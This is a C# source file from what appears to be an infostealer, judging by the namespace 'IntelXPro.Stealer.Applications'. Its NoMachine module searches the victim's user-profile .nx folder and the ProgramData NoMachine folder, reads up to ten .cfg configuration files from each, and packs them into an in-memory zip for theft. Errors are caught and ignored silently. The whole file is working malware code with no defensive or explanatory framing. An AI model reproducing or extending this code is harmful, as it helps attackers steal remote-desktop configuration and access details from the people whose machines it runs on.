using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class NoMachine : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".nx");
            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "NoMachine");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "NoMachine";

            bool foundData = false;

            if (Directory.Exists(userProfilePath))
            {
                foundData |= CollectFromDirectory(userProfilePath, "UserProfile", zip, counterApplications);
            }

            if (Directory.Exists(programDataPath))
            {
                foundData |= CollectFromDirectory(programDataPath, "ProgramData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] cfgFiles = Directory.GetFiles(basePath, "*.cfg", SearchOption.AllDirectories);
                
                foreach (string file in cfgFiles.Take(10))
                {
                    string relativePath = file.Substring(basePath.Length + 1);
                    string zipPath = $"Applications\\NoMachine\\{location}\\{relativePath.Replace("\\", "/")}";
                    zip.AddFile(zipPath, File.ReadAllBytes(file));
                    counterApplications.Files.Add(file + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
